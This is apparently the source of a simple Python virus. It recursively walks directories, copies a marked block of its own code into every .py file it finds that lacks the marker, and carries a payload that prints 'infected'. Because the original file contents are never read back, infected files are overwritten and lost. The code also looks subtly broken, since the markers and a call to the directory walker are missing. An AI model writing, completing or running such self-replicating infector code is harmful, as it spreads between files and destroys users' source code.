import sys
import os

def code(void):
    print("infected")

def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            if (os.path.splitext(path)[1] == ".py"):
                virus(path)
            else:
                pass
        else:
            walk(path)


def virus(python):
    begin = "# START #\n"
    end = "# STOP #\n"

    with open(sys.argv[0], "r") as copy:
        k = 0
        virus_code = "\n"
        for line in copy:
            if line == begin:
                k = 1
                virus_code += begin
            elif k == 1 and line != end:
                virus_code += line
            elif line == end:
                virus_code += end
                break
            else:
                pass

    with open(python, "r") as file:
        original_code = ""
        for line in file:
            if line == begin:
                vir = True
                break
            else:
                vir = False

        if not vir:
            with open(python, "w") as paste:
                paste.write(virus_code + "\n\n" + original_code)
        else:
            pass
